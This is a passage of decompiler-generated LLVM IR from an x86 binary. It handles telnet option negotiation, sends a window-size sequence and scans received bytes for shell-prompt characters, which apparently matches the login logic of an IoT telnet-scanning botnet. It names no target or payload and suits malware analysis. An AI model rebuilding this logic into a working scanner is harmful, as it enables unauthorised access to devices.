  %v1_80513a9 = inttoptr i32 %v3_80513a8 to i32*
  %v2_80513a9 = load i32, i32* %v1_80513a9, align 4
  store i32 %v2_80513a9, i32* %edx.global-to-local, align 4
  %v1_80513aa = add i32 %v0_80513a8, 1888
  store i32 %v1_80513aa, i32* %eax.global-to-local, align 4
  store i32 %v1_80513aa, i32* %v1_80513a9, align 4
  store i32 20, i32* %v1_80513a8, align 4
  %v3_80513b4 = call i32 @function_8051c20(i32 ptrtoint (i32* @0 to i32), i32* nonnull @0)
  store i32 %v3_80513b4, i32* %eax.global-to-local, align 4
  %v0_80513b9 = load i32, i32* @esp, align 4
  %v1_80513b9 = add i32 %v0_80513b9, -4
  %v2_80513b9 = inttoptr i32 %v1_80513b9 to i32*
  store i32 16384, i32* %v2_80513b9, align 4
  %v1_80513be = add i32 %v0_80513b9, 1888
  %v2_80513be = inttoptr i32 %v1_80513be to i32*
  %v3_80513be = load i32, i32* %v2_80513be, align 4
  store i32 %v3_80513be, i32* @esi, align 4
  %v2_80513c5 = add i32 %v0_80513b9, -8
  %v3_80513c5 = inttoptr i32 %v2_80513c5 to i32*
  store i32 %v3_80513be, i32* %v3_80513c5, align 4
  %v2_80513c6 = add i32 %v0_80513b9, -12
  %v3_80513c6 = inttoptr i32 %v2_80513c6 to i32*
  store i32 %v3_80513b4, i32* %v3_80513c6, align 4
  %v0_80513c7 = load i32, i32* @edi, align 4
  %v1_80513c7 = add i32 %v0_80513c7, 4
  %v2_80513c7 = inttoptr i32 %v1_80513c7 to i32*
  %v3_80513c7 = load i32, i32* %v2_80513c7, align 4
  store i32 %v3_80513c7, i32* @ebx, align 4
  %v2_80513ca = add i32 %v0_80513b9, -16
  %v3_80513ca = inttoptr i32 %v2_80513ca to i32*
  store i32 %v3_80513c7, i32* %v3_80513ca, align 4
  %v0_80513cb = call i32 @function_8053304()
  store i32 %v0_80513cb, i32* %eax.global-to-local, align 4
  %v0_80513d0 = load i32, i32* @esp, align 4
  %v1_80513d3 = add i32 %v0_80513d0, 28
  %v2_80513d3 = inttoptr i32 %v1_80513d3 to i32*
  store i32 16384, i32* %v2_80513d3, align 4
  %v1_80513d8 = add i32 %v0_80513d0, 24
  %v2_80513d8 = inttoptr i32 %v1_80513d8 to i32*
  store i32 2, i32* %v2_80513d8, align 4
  %v1_80513da = add i32 %v0_80513d0, 20
  %v2_80513da = inttoptr i32 %v1_80513da to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_80554e6.10 to i32), i32* %v2_80513da, align 4
  %v0_80513df = load i32, i32* @edi, align 4
  %v1_80513df = add i32 %v0_80513df, 4
  %v2_80513df = inttoptr i32 %v1_80513df to i32*
  %v3_80513df = load i32, i32* %v2_80513df, align 4
  store i32 %v3_80513df, i32* %ecx.global-to-local, align 4
  %v2_80513e2 = add i32 %v0_80513d0, 16
  %v3_80513e2 = inttoptr i32 %v2_80513e2 to i32*
  store i32 %v3_80513df, i32* %v3_80513e2, align 4
  %v0_80513e3 = call i32 @function_8053304()
  store i32 %v0_80513e3, i32* %eax.global-to-local, align 4
  %v0_80513e8 = load i32, i32* @esp, align 4
  %v1_80513e8 = inttoptr i32 %v0_80513e8 to i32*
  store i32 20, i32* %v1_80513e8, align 4
  %v2_80513ef = call i32 @function_8051c50(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_80513ef, i32* %eax.global-to-local, align 4
  %v0_80513f7 = load i32, i32* @edi, align 4
  %v1_80513f7 = add i32 %v0_80513f7, 12
  %v2_80513f7 = inttoptr i32 %v1_80513f7 to i32*
  store i32 8, i32* %v2_80513f7, align 4
  br label %dec_label_pc_8051321

dec_label_pc_8051403:                             ; preds = %dec_label_pc_8051024
  %v1_8051403 = add i32 %v0_8051024, 24
  %v2_8051403 = inttoptr i32 %v1_8051403 to i32*
  %v3_8051403 = load i32, i32* %v2_8051403, align 4
  %v1_8051406 = add i32 %v3_8051403, -1
  store i32 %v1_8051406, i32* %eax.global-to-local, align 4
  %tmp147 = icmp slt i32 %v1_8051406, 1
  br i1 %tmp147, label %dec_label_pc_8050fb2.loopexit12.loopexit, label %dec_label_pc_805140f.preheader

dec_label_pc_805140f.preheader:                   ; preds = %dec_label_pc_8051403
  %v7_805140f.pre = load i32, i32* @edx, align 4
  %v2_805140f = add i32 %v0_8051024, 28
  br label %dec_label_pc_805140f

dec_label_pc_805140f:                             ; preds = %dec_label_pc_805140f.preheader, %dec_label_pc_8051440
  %v7_805140f = phi i32 [ %v7_805140f.pre, %dec_label_pc_805140f.preheader ], [ %v9_805140f, %dec_label_pc_8051440 ]
  %v0_80516b6 = phi i32 [ %v1_8051406, %dec_label_pc_805140f.preheader ], [ %v1_8051440, %dec_label_pc_8051440 ]
  %v3_805140f = add i32 %v2_805140f, %v0_80516b6
  %v4_805140f = inttoptr i32 %v3_805140f to i8*
  %v5_805140f = load i8, i8* %v4_805140f, align 1
  %v6_805140f = zext i8 %v5_805140f to i32
  %v8_805140f = and i32 %v7_805140f, -256
  %v9_805140f = or i32 %v6_805140f, %v8_805140f
  store i32 %v9_805140f, i32* %edx.global-to-local, align 4
  %v10_8051413 = icmp eq i8 %v5_805140f, 58
  br i1 %v10_8051413, label %dec_label_pc_80516b6, label %dec_label_pc_805141c

dec_label_pc_805141c:                             ; preds = %dec_label_pc_805140f
  %v10_805141c = icmp eq i8 %v5_805140f, 62
  br i1 %v10_805141c, label %dec_label_pc_80516b6, label %dec_label_pc_8051425

dec_label_pc_8051425:                             ; preds = %dec_label_pc_805141c
  %v10_8051425 = icmp eq i8 %v5_805140f, 36
  br i1 %v10_8051425, label %dec_label_pc_80516b6, label %dec_label_pc_805142e

dec_label_pc_805142e:                             ; preds = %dec_label_pc_8051425
  %v10_805142e = icmp eq i8 %v5_805140f, 35
  br i1 %v10_805142e, label %dec_label_pc_80516b6, label %dec_label_pc_8051437

dec_label_pc_8051437:                             ; preds = %dec_label_pc_805142e
  %v10_8051437 = icmp eq i8 %v5_805140f, 37
  br i1 %v10_8051437, label %dec_label_pc_80516b6, label %dec_label_pc_8051440

dec_label_pc_8051440:                             ; preds = %dec_label_pc_8051437
  %v1_8051440 = add i32 %v0_80516b6, -1
  %v8_8051440 = icmp eq i32 %v1_8051440, 0
  store i32 %v1_8051440, i32* %eax.global-to-local, align 4
  %v1_8051441 = icmp eq i1 %v8_8051440, false
  br i1 %v1_8051441, label %dec_label_pc_805140f, label %dec_label_pc_8050fb2.backedge

dec_label_pc_8051448:                             ; preds = %dec_label_pc_8051053
  %v1_8051448 = add i32 %v0_8051041, 2
  store i32 %v1_8051448, i32* @ebx, align 4
  %v1_805144b = add i32 %v0_805144b, 2
  store i32 %v1_805144b, i32* @ebp, align 4
  br label %dec_label_pc_805103d.backedge

dec_label_pc_805103d.backedge:                    ; preds = %dec_label_pc_8051448, %dec_label_pc_805186a
  %v0_80510bb128 = phi i32 [ %v0_80510bb129, %dec_label_pc_8051448 ], [ %v0_80518a3, %dec_label_pc_805186a ]
  %v1_805103d = phi i32 [ %v1_805104d, %dec_label_pc_8051448 ], [ %v3_80518a3, %dec_label_pc_805186a ]
  %v0_805103d = phi i32 [ %v1_805144b, %dec_label_pc_8051448 ], [ %v0_805103d.pre, %dec_label_pc_805186a ]
  %v5_8051053109 = phi i32 [ %v7_8051053, %dec_label_pc_8051448 ], [ %v0_805189b, %dec_label_pc_805186a ]
  %v0_8051046104 = phi i32 [ %v0_8051460, %dec_label_pc_8051448 ], [ %v1_80518a0, %dec_label_pc_805186a ]
  %v2_805103d = sub i32 %v0_805103d, %v1_805103d
  %v8_805103d = xor i32 %v0_805103d, %v1_805103d
  %v9_805103d = xor i32 %v2_805103d, %v0_805103d
  %v10_805103d = and i32 %v9_805103d, %v8_805103d
  %v11_805103d = icmp slt i32 %v10_805103d, 0
  %v13_805103d = icmp slt i32 %v2_805103d, 0
  %v2_805103f = icmp eq i1 %v13_805103d, %v11_805103d
  br i1 %v2_805103f, label %dec_label_pc_80510b3, label %dec_label_pc_8051041.preheader

dec_label_pc_8051453:                             ; preds = %dec_label_pc_80516c2, %dec_label_pc_8051396, %dec_label_pc_80512d4, %dec_label_pc_8051649, %dec_label_pc_805173b, %dec_label_pc_80515f7, %dec_label_pc_80515a6, %dec_label_pc_80510b3, %dec_label_pc_80517b4
  %v0_8051453 = phi i32 [ %v1_80516b6, %dec_label_pc_80516c2 ], [ %v1_805138a160, %dec_label_pc_8051396 ], [ %v0_80512cb, %dec_label_pc_80512d4 ], [ %v1_805163d, %dec_label_pc_8051649 ], [ %v1_805172f, %dec_label_pc_805173b ], [ %v0_80515f7, %dec_label_pc_80515f7 ], [ %v0_80515a6, %dec_label_pc_80515a6 ], [ %v0_80510b3, %dec_label_pc_80510b3 ], [ %v1_80517a8, %dec_label_pc_80517b4 ]
  %v1_8051453 = icmp eq i32 %v0_8051453, 0
  %v1_8051455 = icmp eq i1 %v1_8051453, false
  br i1 %v1_8051455, label %dec_label_pc_8051321, label %dec_label_pc_8050fb2.loopexit12.loopexit

dec_label_pc_8051460:                             ; preds = %dec_label_pc_805105e
  %v1_8051460 = add i32 %v0_8051460, 1879
  %v2_8051460 = inttoptr i32 %v1_8051460 to i8*
  store i8 -1, i8* %v2_8051460, align 1
  %v0_8051468 = load i32, i32* @esp, align 4
  %v1_8051468 = add i32 %v0_8051468, 1880
  %v2_8051468 = inttoptr i32 %v1_8051468 to i8*
  store i8 -5, i8* %v2_8051468, align 1
  %v0_8051470 = load i32, i32* @esp, align 4
  %v1_8051470 = add i32 %v0_8051470, 1881
  %v2_8051470 = inttoptr i32 %v1_8051470 to i8*
  store i8 31, i8* %v2_8051470, align 1
  %v0_8051478 = load i32, i32* @esp, align 4
  %v1_8051478 = add i32 %v0_8051478, 1847
  %v2_8051478 = inttoptr i32 %v1_8051478 to i8*
  store i8 -1, i8* %v2_8051478, align 1
  %v0_8051480 = load i32, i32* @esp, align 4
  %v1_8051480 = add i32 %v0_8051480, 1848
  %v2_8051480 = inttoptr i32 %v1_8051480 to i8*
  store i8 -6, i8* %v2_8051480, align 1
  %v0_8051488 = load i32, i32* @esp, align 4
  %v1_8051488 = add i32 %v0_8051488, 1849
  %v2_8051488 = inttoptr i32 %v1_8051488 to i8*
  store i8 31, i8* %v2_8051488, align 1
  %v0_8051490 = load i32, i32* @esp, align 4
  %v1_8051490 = add i32 %v0_8051490, 1850
  %v2_8051490 = inttoptr i32 %v1_8051490 to i8*
  store i8 0, i8* %v2_8051490, align 1
  %v0_8051498 = load i32, i32* @esp, align 4
  %v1_8051498 = add i32 %v0_8051498, 1851
  %v2_8051498 = inttoptr i32 %v1_8051498 to i8*
  store i8 80, i8* %v2_8051498, align 1
  %v0_80514a0 = load i32, i32* @esp, align 4
  %v1_80514a0 = add i32 %v0_80514a0, 1852
  %v2_80514a0 = inttoptr i32 %v1_80514a0 to i8*
  store i8 0, i8* %v2_80514a0, align 1
  %v0_80514a8 = load i32, i32* @esp, align 4
  %v1_80514a8 = add i32 %v0_80514a8, 1853
  %v2_80514a8 = inttoptr i32 %v1_80514a8 to i8*
  store i8 24, i8* %v2_80514a8, align 1
  %v0_80514b0 = load i32, i32* @esp, align 4
  %v1_80514b0 = add i32 %v0_80514b0, 1854
  %v2_80514b0 = inttoptr i32 %v1_80514b0 to i8*
  store i8 -1, i8* %v2_80514b0, align 1
  %v0_80514b8 = load i32, i32* @esp, align 4
  %v1_80514b8 = add i32 %v0_80514b8, 1855
  %v2_80514b8 = inttoptr i32 %v1_80514b8 to i8*
  store i8 -16, i8* %v2_80514b8, align 1
  %v0_80514c0 = load i32, i32* @esp, align 4
  %v1_80514c0 = add i32 %v0_80514c0, 16
  %v2_80514c0 = inttoptr i32 %v1_80514c0 to i32*
  %v3_80514c0 = load i32, i32* %v2_80514c0, align 4
  store i32 %v3_80514c0, i32* %eax.global-to-local, align 4
  %v0_80514c4 = load i32, i32* @edi, align 4
  %v1_80514c4 = add i32 %v0_80514c4, 24
  %v2_80514c4 = inttoptr i32 %v1_80514c4 to i32*
  %v3_80514c4 = load i32, i32* %v2_80514c4, align 4
  store i32 %v3_80514c4, i32* %ecx.global-to-local, align 4
  %v0_80514c7 = load i32, i32* @ebx, align 4
  %v1_80514c7 = add i32 %v0_80514c7, 2
  store i32 %v1_80514c7, i32* %edx.global-to-local, align 4
  %v2_80514ca = add i32 %v3_80514c4, %v3_80514c0
  store i32 %v2_80514ca, i32* %eax.global-to-local, align 4
  %tmp299 = icmp ugt i32 %v2_80514ca, %v1_80514c7
  br i1 %tmp299, label %dec_label_pc_80514d4, label %dec_label_pc_8051460.dec_label_pc_80510b3.loopexit_crit_edge

dec_label_pc_8051460.dec_label_pc_80510b3.loopexit_crit_edge: ; preds = %dec_label_pc_8051460
  %v0_80510b3.pre.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_80510b3

dec_label_pc_80514d4:                             ; preds = %dec_label_pc_8051460
  %v2_80514d4 = inttoptr i32 %v1_80514c7 to i8*
  %v3_80514d4 = load i8, i8* %v2_80514d4, align 1
  %v12_80514d4 = icmp eq i8 %v3_80514d4, 31
  br i1 %v12_80514d4, label %dec_label_pc_805186a, label %dec_label_pc_80514de

dec_label_pc_80514de:                             ; preds = %dec_label_pc_80514d4
  %v1_80514de = inttoptr i32 %v0_80514c7 to i8*
  %v2_80514de = load i8, i8* %v1_80514de, align 1
  %v3_80514de = zext i8 %v2_80514de to i32
  %v5_80514de = and i32 %v2_80514ca, -256
  %v6_80514de = or i32 %v3_80514de, %v5_80514de
  store i32 %v6_80514de, i32* %eax.global-to-local, align 4
  %v11_80514e0 = icmp eq i8 %v2_80514de, -3
  %v1_80514e2 = icmp eq i1 %v11_80514e0, false
  br i1 %v1_80514e2, label %dec_label_pc_8051a33, label %dec_label_pc_80514e8

dec_label_pc_80514e8:                             ; preds = %dec_label_pc_80514de
  store i8 -4, i8* %v1_80514de, align 1
  %v0_80514eb = load i32, i32* @esi, align 4
  %v1_80514eb = inttoptr i32 %v0_80514eb to i8*
  %v2_80514eb = load i8, i8* %v1_80514eb, align 1
  %v3_80514eb = zext i8 %v2_80514eb to i32
  %v4_80514eb = load i32, i32* %eax.global-to-local, align 4
  %v5_80514eb = and i32 %v4_80514eb, -256
  %v6_80514eb = or i32 %v5_80514eb, %v3_80514eb
  store i32 %v6_80514eb, i32* %eax.global-to-local, align 4
  %v11_80514ed = icmp eq i8 %v2_80514eb, -3
  %v1_80514ef = icmp eq i1 %v11_80514ed, false
  br i1 %v1_80514ef, label %dec_label_pc_8051077, label %dec_label_pc_80514f5

dec_label_pc_80514f5:                             ; preds = %dec_label_pc_80514e8, %dec_label_pc_805106d
  %v0_80514f5 = phi i32 [ %v0_80514eb, %dec_label_pc_80514e8 ], [ %v0_805106d, %dec_label_pc_805106d ]
  %v1_80514f5 = inttoptr i32 %v0_80514f5 to i8*
  store i8 -4, i8* %v1_80514f5, align 1
  %v0_80514f8 = load i32, i32* @ebx, align 4
  %v1_80514f8 = add i32 %v0_80514f8, 2
  %v2_80514f8 = inttoptr i32 %v1_80514f8 to i8*
  %v3_80514f8 = load i8, i8* %v2_80514f8, align 1
  %v4_80514f8 = zext i8 %v3_80514f8 to i32
  %v5_80514f8 = load i32, i32* %eax.global-to-local, align 4
  %v6_80514f8 = and i32 %v5_80514f8, -256
  %v7_80514f8 = or i32 %v6_80514f8, %v4_80514f8
  store i32 %v7_80514f8, i32* %eax.global-to-local, align 4
  %v11_80514fb = icmp eq i8 %v3_80514f8, -3
  %v1_80514fd = icmp eq i1 %v11_80514fb, false
  br i1 %v1_80514fd, label %dec_label_pc_805108a, label %dec_label_pc_8051503

dec_label_pc_8051503:                             ; preds = %dec_label_pc_80514f5, %dec_label_pc_805107f
  %v0_8051503 = phi i32 [ %v0_80514f8, %dec_label_pc_80514f5 ], [ %v0_805107f, %dec_label_pc_805107f ]
  %v1_8051503 = add i32 %v0_8051503, 2
  %v2_8051503 = inttoptr i32 %v1_8051503 to i8*
  store i8 -4, i8* %v2_8051503, align 1
  br label %dec_label_pc_8051092

dec_label_pc_805150c:                             ; preds = %dec_label_pc_8050fcd
  %v1_8050ffa = icmp eq i32 %v0_8050ff2, 0
  br i1 %v1_8050ffa, label %dec_label_pc_8051a18, label %dec_label_pc_8051512

dec_label_pc_8051512:                             ; preds = %dec_label_pc_805150c
  %v10_8051512 = icmp eq i32 %v0_8050ff2, -1
  %v1_8051515 = icmp eq i1 %v10_8051512, false
  br i1 %v1_8051515, label %dec_label_pc_8051014, label %dec_label_pc_805151b

dec_label_pc_805151b:                             ; preds = %dec_label_pc_8051512
  %v1_805151b = add i32 %v0_8050ff7, 56
  %v2_805151b = inttoptr i32 %v1_805151b to i32*
  %v3_805151b = load i32, i32* %v2_805151b, align 4
  store i32 %v3_805151b, i32* %edx.global-to-local, align 4
  %v1_805151f = inttoptr i32 %v3_805151b to i32*
  %v2_805151f = load i32, i32* %v1_805151f, align 4
  %v11_805151f = icmp eq i32 %v2_805151f, 11
  br i1 %v11_805151f, label %dec_label_pc_8050f5b, label %dec_label_pc_8051528

dec_label_pc_8051528:                             ; preds = %dec_label_pc_805151b, %dec_label_pc_8051a18
  %v0_8051528 = phi i32 [ %v1_8050ff7, %dec_label_pc_805151b ], [ %v0_8051528.pre, %dec_label_pc_8051a18 ]
  %v0_805152b = load i32, i32* @edi, align 4
  %v1_805152b = add i32 %v0_805152b, 4
  %v2_805152b = inttoptr i32 %v1_805152b to i32*
  %v3_805152b = load i32, i32* %v2_805152b, align 4
  store i32 %v3_805152b, i32* @esi, align 4
  %v2_805152e = add i32 %v0_8051528, -16
  %v3_805152e = inttoptr i32 %v2_805152e to i32*
  store i32 %v3_805152b, i32* %v3_805152e, align 4
  %v1_805152f = call i32 @function_8052bc1(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_805152f, i32* %eax.global-to-local, align 4
  %v0_8051534 = load i32, i32* @edi, align 4
  %v1_8051534 = add i32 %v0_8051534, 284
  %v2_8051534 = inttoptr i32 %v1_8051534 to i8*
  %v3_8051534 = load i8, i8* %v2_8051534, align 1
  %v4_8051534 = zext i8 %v3_8051534 to i32
  %v6_8051534 = and i32 %v1_805152f, -256
  %v7_8051534 = or i32 %v4_8051534, %v6_8051534
  %v1_805153d = add i32 %v7_8051534, 1
  store i32 %v1_805153d, i32* %eax.global-to-local, align 4
  %v1_805153e = add i32 %v0_8051534, 4
  %v2_805153e = inttoptr i32 %v1_805153e to i32*
  store i32 -1, i32* %v2_805153e, align 4
  %v0_8051545 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051545 = trunc i32 %v0_8051545 to i8
  %v2_8051545 = load i32, i32* @edi, align 4
  %v3_8051545 = add i32 %v2_8051545, 284
  %v4_8051545 = inttoptr i32 %v3_8051545 to i8*
  store i8 %v1_8051545, i8* %v4_8051545, align 1
  %v0_805154b = load i32, i32* %eax.global-to-local, align 4
  %v1_805154b = trunc i32 %v0_805154b to i8
  %tmp300 = icmp ult i8 %v1_805154b, 10
  %v0_8051a27 = load i32, i32* @edi, align 4
  br i1 %tmp300, label %dec_label_pc_8051a27, label %dec_label_pc_8051553

dec_label_pc_8051553:                             ; preds = %dec_label_pc_8051528
  %v1_8051553 = add i32 %v0_8051a27, 284
  %v2_8051553 = inttoptr i32 %v1_8051553 to i8*
  store i8 0, i8* %v2_8051553, align 1
  %v0_805155a = load i32, i32* @edi, align 4
  %v1_805155a = add i32 %v0_805155a, 12
  %v2_805155a = inttoptr i32 %v1_805155a to i32*
  store i32 0, i32* %v2_805155a, align 4
  br label %dec_label_pc_8050f5b

dec_label_pc_8051566:                             ; preds = %dec_label_pc_8051077
  %v1_8051566 = inttoptr i32 %v0_8051566 to i8*
  store i8 -3, i8* %v1_8051566, align 1
  %v5_805107f.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805107f

dec_label_pc_805156e:                             ; preds = %dec_label_pc_805108a
  %v1_805156e = add i32 %v0_805156e, 2
  %v2_805156e = inttoptr i32 %v1_805156e to i8*
  store i8 -3, i8* %v2_805156e, align 1
  br label %dec_label_pc_8051092

dec_label_pc_8051577:                             ; preds = %dec_label_pc_8050fb9
  %v0_8051577 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_8051577, i32* %edx.global-to-local, align 4
  %v1_8051579 = load i32, i32* @esp, align 4
  %v2_8051579 = add i32 %v1_8051579, -4
  %v3_8051579 = inttoptr i32 %v2_8051579 to i32*
  store i32 %v0_8051577, i32* %v3_8051579, align 4
  %v0_805157a = load i32, i32* @edi, align 4
  %v1_805157a = add i32 %v0_805157a, 92
  store i32 %v1_805157a, i32* %eax.global-to-local, align 4
  %v1_805157d = add i32 %v1_8051579, -8
  %v2_805157d = inttoptr i32 %v1_805157d to i32*
  store i32 192, i32* %v2_805157d, align 4
  %v0_8051582 = load i32, i32* %eax.global-to-local, align 4
  %v2_8051582 = add i32 %v1_8051579, -12
  %v3_8051582 = inttoptr i32 %v2_8051582 to i32*
  store i32 %v0_8051582, i32* %v3_8051582, align 4
  %v0_8051583 = load i32, i32* %edx.global-to-local, align 4
  %v2_8051583 = add i32 %v1_8051579, -16
  %v3_8051583 = inttoptr i32 %v2_8051583 to i32*
  store i32 %v0_8051583, i32* %v3_8051583, align 4
  %v4_8051584 = call i32 @function_8053123(i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8051584, i32* %eax.global-to-local, align 4
  %v0_8051589 = load i32, i32* @edi, align 4
  %v1_8051589 = add i32 %v0_8051589, 24
  %v2_8051589 = inttoptr i32 %v1_8051589 to i32*
  %v3_8051589 = load i32, i32* %v2_8051589, align 4
  %v1_805158c = add i32 %v3_8051589, -64
  store i32 %v1_805158c, i32* %eax.global-to-local, align 4
  store i32 %v1_805158c, i32* %v2_8051589, align 4
  br label %dec_label_pc_8050fcd

dec_label_pc_805159a:                             ; preds = %dec_label_pc_80510f9, %dec_label_pc_80510f0, %dec_label_pc_80510e7, %dec_label_pc_80510de, %dec_label_pc_80510d1
  %v1_805159a = add i32 %v0_805159a, 1
  store i32 %v1_805159a, i32* @ebp, align 4
  %v10_805159d = icmp eq i32 %v0_805159a, -2
  br i1 %v10_805159d, label %dec_label_pc_8051105, label %dec_label_pc_80515a6

dec_label_pc_80515a6:                             ; preds = %dec_label_pc_805159a, %dec_label_pc_8051125, %dec_label_pc_8051105
  %v0_80515a6 = phi i32 [ %v1_805159a, %dec_label_pc_805159a ], [ %v0_8051135, %dec_label_pc_8051125 ], [ %v0_8051112, %dec_label_pc_8051105 ]
  %tmp148 = icmp slt i32 %v0_80515a6, 1
  br i1 %tmp148, label %dec_label_pc_8051453, label %dec_label_pc_80515ae

dec_label_pc_80515ae:                             ; preds = %dec_label_pc_80515a6
  %v0_80515ae = load i32, i32* @edi, align 4
  %v1_80515ae = inttoptr i32 %v0_80515ae to i32*
  %v2_80515ae = load i32, i32* %v1_80515ae, align 4
  store i32 %v2_80515ae, i32* %edx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_80515b2 = load i32, i32* @esp, align 4
  %v1_80515b2 = add i32 %v0_80515b2, -4
  %v2_80515b2 = inttoptr i32 %v1_80515b2 to i32*
  store i32 16384, i32* %v2_80515b2, align 4
  %v0_80515b7 = load i32, i32* %edx.global-to-local, align 4
  %v1_80515b7 = add i32 %v0_80515b7, 12
  %v2_80515b7 = inttoptr i32 %v1_80515b7 to i8*
  %v3_80515b7 = load i8, i8* %v2_80515b7, align 1
  %v4_80515b7 = zext i8 %v3_80515b7 to i32
  %v5_80515b7 = load i32, i32* %eax.global-to-local, align 4
  %v6_80515b7 = and i32 %v5_80515b7, -256
  %v7_80515b7 = or i32 %v6_80515b7, %v4_80515b7
  store i32 %v7_80515b7, i32* %eax.global-to-local, align 4
  %v2_80515ba = add i32 %v0_80515b2, -8
  %v3_80515ba = inttoptr i32 %v2_80515ba to i32*
  store i32 %v7_80515b7, i32* %v3_80515ba, align 4
  %v0_80515bb = load i32, i32* %edx.global-to-local, align 4
  %v1_80515bb = inttoptr i32 %v0_80515bb to i32*
  %v2_80515bb = load i32, i32* %v1_80515bb, align 4
  store i32 %v2_80515bb, i32* %eax.global-to-local, align 4
  %v2_80515bd = add i32 %v0_80515b2, -12
  %v3_80515bd = inttoptr i32 %v2_80515bd to i32*
  store i32 %v2_80515bb, i32* %v3_80515bd, align 4
  %v0_80515be = load i32, i32* @edi, align 4
  %v1_80515be = add i32 %v0_80515be, 4
  %v2_80515be = inttoptr i32 %v1_80515be to i32*
  %v3_80515be = load i32, i32* %v2_80515be, align 4
  store i32 %v3_80515be, i32* %eax.global-to-local, align 4
  %v2_80515c1 = add i32 %v0_80515b2, -16
  %v3_80515c1 = inttoptr i32 %v2_80515c1 to i32*
  store i32 %v3_80515be, i32* %v3_80515c1, align 4
  %v0_80515c2 = call i32 @function_8053304()
  store i32 %v0_80515c2, i32* %eax.global-to-local, align 4
  %v0_80515c7 = load i32, i32* @esp, align 4
  %v1_80515c7 = add i32 %v0_80515c7, -4
  %v2_80515c7 = inttoptr i32 %v1_80515c7 to i32*
  store i32 16384, i32* %v2_80515c7, align 4
  %v1_80515cc = add i32 %v0_80515c7, -8
  %v2_80515cc = inttoptr i32 %v1_80515cc to i32*
  store i32 2, i32* %v2_80515cc, align 4
  %v1_80515ce = add i32 %v0_80515c7, -12
  %v2_80515ce = inttoptr i32 %v1_80515ce to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_80554e6.10 to i32), i32* %v2_80515ce, align 4
  %v0_80515d3 = load i32, i32* @edi, align 4
  %v1_80515d3 = add i32 %v0_80515d3, 4
  %v2_80515d3 = inttoptr i32 %v1_80515d3 to i32*
  %v3_80515d3 = load i32, i32* %v2_80515d3, align 4
  store i32 %v3_80515d3, i32* %eax.global-to-local, align 4
  %v2_80515d6 = add i32 %v0_80515c7, -16
  %v3_80515d6 = inttoptr i32 %v2_80515d6 to i32*
  store i32 %v3_80515d3, i32* %v3_80515d6, align 4
  %v0_80515d7 = call i32 @function_8053304()
  store i32 %v0_80515d7, i32* %eax.global-to-local, align 4
  %v0_80515df = load i32, i32* @edi, align 4
  %v1_80515df = add i32 %v0_80515df, 12
  %v2_80515df = inttoptr i32 %v1_80515df to i32*
  store i32 4, i32* %v2_80515df, align 4
  br label %dec_label_pc_8051321

dec_label_pc_80515eb:                             ; preds = %dec_label_pc_8051179, %dec_label_pc_8051170, %dec_label_pc_8051167, %dec_label_pc_805115a
  %v1_80515eb = add i32 %v0_80515eb, 1
  store i32 %v1_80515eb, i32* @ebp, align 4
  %v10_80515ee = icmp eq i32 %v0_80515eb, -2
  br i1 %v10_80515ee, label %dec_label_pc_8051185, label %dec_label_pc_80515f7

dec_label_pc_80515f7:                             ; preds = %dec_label_pc_80515eb, %dec_label_pc_8051185
  %v0_80515f7 = phi i32 [ %v1_80515eb, %dec_label_pc_80515eb ], [ %v0_8051192, %dec_label_pc_8051185 ]
  %tmp149 = icmp slt i32 %v0_80515f7, 1
  br i1 %tmp149, label %dec_label_pc_8051453, label %dec_label_pc_80515ff

dec_label_pc_80515ff:                             ; preds = %dec_label_pc_80515f7
  %v0_80515ff = load i32, i32* @edi, align 4
  %v1_80515ff = inttoptr i32 %v0_80515ff to i32*
  %v2_80515ff = load i32, i32* %v1_80515ff, align 4
  store i32 %v2_80515ff, i32* %edx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8051603 = load i32, i32* @esp, align 4
  %v1_8051603 = add i32 %v0_8051603, -4
  %v2_8051603 = inttoptr i32 %v1_8051603 to i32*
  store i32 16384, i32* %v2_8051603, align 4
  %v0_8051608 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051608 = add i32 %v0_8051608, 13
  %v2_8051608 = inttoptr i32 %v1_8051608 to i8*
  %v3_8051608 = load i8, i8* %v2_8051608, align 1
  %v4_8051608 = zext i8 %v3_8051608 to i32
  %v5_8051608 = load i32, i32* %eax.global-to-local, align 4
  %v6_8051608 = and i32 %v5_8051608, -256
  %v7_8051608 = or i32 %v6_8051608, %v4_8051608
  store i32 %v7_8051608, i32* %eax.global-to-local, align 4
  %v2_805160b = add i32 %v0_8051603, -8
  %v3_805160b = inttoptr i32 %v2_805160b to i32*
  store i32 %v7_8051608, i32* %v3_805160b, align 4
  %v0_805160c = load i32, i32* %edx.global-to-local, align 4
  %v1_805160c = add i32 %v0_805160c, 4
  %v2_805160c = inttoptr i32 %v1_805160c to i32*
  %v3_805160c = load i32, i32* %v2_805160c, align 4
  store i32 %v3_805160c, i32* @esi, align 4
  %v2_805160f = add i32 %v0_8051603, -12
  %v3_805160f = inttoptr i32 %v2_805160f to i32*
  store i32 %v3_805160c, i32* %v3_805160f, align 4
  %v0_8051610 = load i32, i32* @edi, align 4
  %v1_8051610 = add i32 %v0_8051610, 4
  %v2_8051610 = inttoptr i32 %v1_8051610 to i32*
  %v3_8051610 = load i32, i32* %v2_8051610, align 4
  store i32 %v3_8051610, i32* @ebx, align 4
  %v2_8051613 = add i32 %v0_8051603, -16
  %v3_8051613 = inttoptr i32 %v2_8051613 to i32*
  store i32 %v3_8051610, i32* %v3_8051613, align 4
  %v0_8051614 = call i32 @function_8053304()
  store i32 %v0_8051614, i32* %eax.global-to-local, align 4
  %v0_8051619 = load i32, i32* @esp, align 4
  %v1_8051619 = add i32 %v0_8051619, -4
  %v2_8051619 = inttoptr i32 %v1_8051619 to i32*
  store i32 16384, i32* %v2_8051619, align 4
  %v1_805161e = add i32 %v0_8051619, -8
  %v2_805161e = inttoptr i32 %v1_805161e to i32*
  store i32 2, i32* %v2_805161e, align 4
  %v1_8051620 = add i32 %v0_8051619, -12
